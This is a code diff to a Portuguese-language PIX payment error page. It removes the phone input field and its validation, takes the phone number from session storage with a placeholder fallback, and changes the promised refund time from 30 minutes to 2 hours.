@@ -272,15 +272,11 @@
         <p class="error-text">Não foi possível processar o seu pagamento.</p>
 
         <div class="refund-notice">
-          <strong>⚠️ Atenção:</strong> Caso o valor tenha saído da sua conta, ele será <strong>reembolsado integralmente</strong> em até 30 minutos.
+          <strong>⚠️ Atenção:</strong> Caso o valor tenha saído da sua conta, ele será <strong>reembolsado integralmente</strong> em até 2 horas.
         </div>
 
         <p class="error-text" style="margin-bottom: 20px;">Gere um novo código PIX para tentar novamente:</p>
 
-        <div class="phone-input-wrapper">
-          <label for="phone">Telefone</label>
-          <input type="tel" id="phone" placeholder="(11) 99999-9999" maxlength="15">
-        </div>
 
         <button class="generate-btn" id="generateBtn">Gerar Novo PIX</button>
         <div class="error-msg" id="errorMsg"></div>
@@ -313,7 +309,6 @@
 
   <script src="js/qrcode.min.js"></script>
   <script>
-    const phoneInput = document.getElementById('phone');
     const generateBtn = document.getElementById('generateBtn');
     const errorMsg = document.getElementById('errorMsg');
     const formArea = document.getElementById('formArea');
@@ -326,25 +321,13 @@
     let pollInterval = null;
     let countdownInterval = null;
 
-    // Máscara de telefone
-    phoneInput.addEventListener('input', () => {
-      let v = phoneInput.value.replace(/\D/g, "");
-      if (v.length > 11) v = v.slice(0, 11);
-      if (v.length > 6) v = `(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7)}`;
-      else if (v.length > 2) v = `(${v.slice(0,2)}) ${v.slice(2)}`;
-      phoneInput.value = v;
-    });
-
-    // Preencher telefone do sessionStorage se disponível
+    // Pegar telefone do sessionStorage
+    let savedPhone = '11999999999';
     try {
       const cached = sessionStorage.getItem('customer_data');
       if (cached) {
         const data = JSON.parse(cached);
-        if (data.phone) {
-          let v = data.phone.replace(/\D/g, "");
-          if (v.length === 11) phoneInput.value = `(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7)}`;
-          else phoneInput.value = v;
-        }
+        if (data.phone) savedPhone = data.phone.replace(/\D/g, "");
       }
     } catch(e) {}
 
@@ -411,13 +394,6 @@
 
     // Gerar PIX
     generateBtn.addEventListener('click', async () => {
-      const phone = phoneInput.value.replace(/\D/g, "");
-
-      if (phone.length < 10) {
-        showError("Digite seu telefone corretamente.");
-        return;
-      }
-
       generateBtn.disabled = true;
       generateBtn.textContent = "Processando...";
       errorMsg.style.display = 'none';
@@ -428,7 +404,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             amount: 1490,
-            customer: { phone }
+            customer: { phone: savedPhone }
           })
         });
 
